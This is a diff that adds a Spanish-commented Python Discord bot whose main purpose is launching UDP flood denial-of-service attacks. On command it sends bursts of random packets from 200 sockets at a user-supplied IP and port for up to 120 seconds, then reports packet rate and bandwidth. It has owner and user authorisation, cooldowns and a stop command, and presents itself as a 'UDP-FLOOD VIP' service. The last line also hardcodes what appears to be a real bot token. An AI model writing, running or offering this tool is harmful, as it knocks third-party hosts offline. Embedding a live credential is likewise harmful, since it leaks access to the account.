@@ -1,0 +1,191 @@
+import discord
+from discord.ext import commands
+import socket
+import random
+import time
+import threading
+import asyncio
+import psutil
+
+# Configuración
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='$', intents=intents)
+
+# Constantes
+OWNER_ID = "1102257907522863175"
+COOLDOWN_SECONDS = 10
+MAX_ATTACK_TIME = 120
+SOCKET_LIMIT = 200
+PACKETS_PER_BURST = 150
+
+# Variables globales
+authorized_users = set()
+attack_in_progress = False
+last_attack_time = 0
+current_attack_stop_event = None
+
+# Métodos disponibles
+available_methods = {
+    "udpflood": "Ataque UDP 1M+ pps (IP PORT TIME)",
+    "stop": "Detener ataque actual",
+    "adduser": "Autorizar usuario (ADMIN ONLY)",
+    "status": "Ver estado del servidor",
+    "methods": "Lista de comandos disponibles"
+}
+
+# Paquetes pre-generados
+PACKET_SIZES = [512, 1024, 1450]
+pre_generated_packets = [random._urandom(size) for size in PACKET_SIZES]
+
+# Verificación de owner
+def is_owner(ctx):
+    return str(ctx.author.id) == OWNER_ID
+
+# Optimización de sockets
+def create_optimized_socket():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+    s.setblocking(False)
+    return s
+
+# Comando: methods
+@bot.command(name='methods')
+async def list_methods(ctx):
+    embed = discord.Embed(title="🔥 COMANDOS DISPONIBLES", color=0x00ff00)
+    for method, desc in available_methods.items():
+        embed.add_field(name=f"${method}", value=desc, inline=False)
+    embed.set_footer(text=f"Owner: {bot.get_user(int(OWNER_ID))}")
+    await ctx.send(embed=embed)
+
+# Comando: adduser
+@bot.command(name='adduser')
+async def add_user(ctx, user_id: str):
+    if not (is_owner(ctx) or ctx.author.guild_permissions.administrator):
+        await ctx.send("❌ Solo el owner/admins pueden usar esto")
+        return
+    
+    authorized_users.add(user_id)
+    await ctx.send(f"✅ Usuario {user_id} autorizado")
+
+# Comando: status
+@bot.command(name='status')
+async def system_status(ctx):
+    embed = discord.Embed(title="📊 ESTADO DEL SERVIDOR", color=0x3498db)
+    
+    # Recursos
+    embed.add_field(name="CPU", value=f"{psutil.cpu_percent()}%", inline=True)
+    embed.add_field(name="RAM", value=f"{psutil.virtual_memory().percent}%", inline=True)
+    
+    # Estado del bot
+    status = "🔴 ATAQUE ACTIVO" if attack_in_progress else "🟢 LISTO"
+    embed.add_field(name="Bot", value=status, inline=False)
+    
+    if attack_in_progress:
+        remaining = max(0, COOLDOWN_SECONDS - (time.time() - last_attack_time))
+        embed.add_field(name="Cooldown", value=f"{int(remaining)}s", inline=True)
+    
+    await ctx.send(embed=embed)
+
+# Comando: stop
+@bot.command(name='stop')
+async def stop_attack(ctx):
+    global current_attack_stop_event
+    
+    if not (is_owner(ctx) or str(ctx.author.id) in authorized_users):
+        await ctx.send("❌ No tienes permisos")
+        return
+    
+    if current_attack_stop_event:
+        current_attack_stop_event.set()
+        await ctx.send("🛑 Ataque detenido por fuerza mayor" if is_owner(ctx) else "🛑 Ataque detenido")
+    else:
+        await ctx.send("⚠️ No hay ataques activos")
+
+# Comando: udpflood
+@bot.command(name='udpflood')
+async def udp_flood(ctx, ip: str, port: int, tiempo: int):
+    if not (is_owner(ctx) or str(ctx.author.id) in authorized_users):
+        await ctx.send("❌ Acceso denegado")
+        return
+    
+    if tiempo > MAX_ATTACK_TIME:
+        await ctx.send(f"❌ Tiempo máximo: {MAX_ATTACK_TIME}s")
+        return
+    
+    global attack_in_progress, last_attack_time, current_attack_stop_event
+    
+    if attack_in_progress:
+        await ctx.send("⚠️ Ataque ya en progreso")
+        return
+    
+    if time.time() - last_attack_time < COOLDOWN_SECONDS:
+        remaining = int(COOLDOWN_SECONDS - (time.time() - last_attack_time))
+        await ctx.send(f"⏳ Cooldown: {remaining}s")
+        return
+    
+    # Iniciar ataque
+    attack_in_progress = True
+    current_attack_stop_event = threading.Event()
+    
+    # Embed de inicio
+    embed = discord.Embed(
+        title="💥 UDP-FLOOD VIP",
+        description=f"**Target:** `{ip}:{port}`\n**Duración:** `{tiempo}s`\n**Sockets:** `{SOCKET_LIMIT}`",
+        color=0xff0000
+    )
+    await ctx.send(embed=embed)
+    
+    try:
+        # Crear sockets
+        sockets = [create_optimized_socket() for _ in range(SOCKET_LIMIT)]
+        end_time = time.time() + tiempo
+        packet_count = 0
+        
+        # Bucle de ataque
+        while time.time() < end_time and not current_attack_stop_event.is_set():
+            for s in sockets:
+                try:
+                    for _ in range(PACKETS_PER_BURST):
+                        s.sendto(random.choice(pre_generated_packets), (ip, port))
+                        packet_count += 1
+                except:
+                    continue
+            
+            if packet_count % 100000 == 0:
+                await asyncio.sleep(0.001)
+        
+        # Resultados
+        pps = packet_count / tiempo
+        avg_size = sum(PACKET_SIZES)/len(PACKET_SIZES)
+        mbps = (packet_count * avg_size * 8) / (1024 * 1024 * tiempo)
+        
+        embed = discord.Embed(
+            title="📊 RESULTADOS",
+            description=(
+                f"**Paquetes:** {packet_count:,}\n"
+                f"**Velocidad:** {pps:,.0f} pps\n"
+                f"**Ancho de banda:** {mbps:.2f} Mbps"
+            ),
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+    finally:
+        attack_in_progress = False
+        last_attack_time = time.time()
+        for s in sockets:
+            try:
+                s.close()
+            except:
+                pass
+
+@bot.event
+async def on_ready():
+    print(f'⚡ Bot iniciado como {bot.user.name}')
+    await bot.change_presence(activity=discord.Game(name="UDP-FLOOD VIP | $methods"))
+
+bot.run('MTI3MzQzMzY4NjI3MTg1Njc2Mw.GEMMsQ.Qq2Yh6BPrvQRVS7_d33rcXCK1C_X7KLK1cn2Bk')
